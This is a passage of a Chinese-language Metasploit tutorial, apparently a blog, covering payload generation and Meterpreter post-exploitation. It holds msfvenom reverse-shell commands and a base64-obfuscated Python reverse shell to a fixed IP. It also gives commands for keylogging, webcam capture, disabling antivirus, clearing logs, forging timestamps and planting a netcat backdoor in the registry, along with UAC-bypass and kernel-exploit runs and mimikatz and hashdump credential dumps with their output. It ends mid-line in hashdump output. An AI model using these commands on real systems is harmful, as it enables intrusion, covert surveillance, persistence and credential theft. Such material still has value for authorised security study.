Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

执行方式：复制shell.py中的内容在linux命令行下执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>

4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>

<h2 id="4-Meterpreter基本命令-1"><a href="#4-Meterpreter基本命令-1" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2>首先需要先获取meterpreter：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure>

如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。获取到了meterpreter，就可以进行后渗透了。<h3 id="4-1-基本系统命令-1"><a href="#4-1-基本系统命令-1" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>

<h3 id="4-2-文件系统命令-1"><a href="#4-2-文件系统命令-1" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure>

<h3 id="4-3-网络命令-1"><a href="#4-3-网络命令-1" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>

<h3 id="4-4-信息收集-1"><a href="#4-4-信息收集-1" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure>

<h3 id="4-5-提权-1"><a href="#4-5-提权-1" class="headerlink" title="4.5 提权"></a>4.5 提权</h3>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>

2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。msf提供了如下几个模块帮助绕过UAC：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>

使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure>

3.内核漏洞提权无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure>

<h3 id="4-6-获取凭证-1"><a href="#4-6-获取凭证-1" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。1.使用mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>使用meterpreter的run hashdump命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span 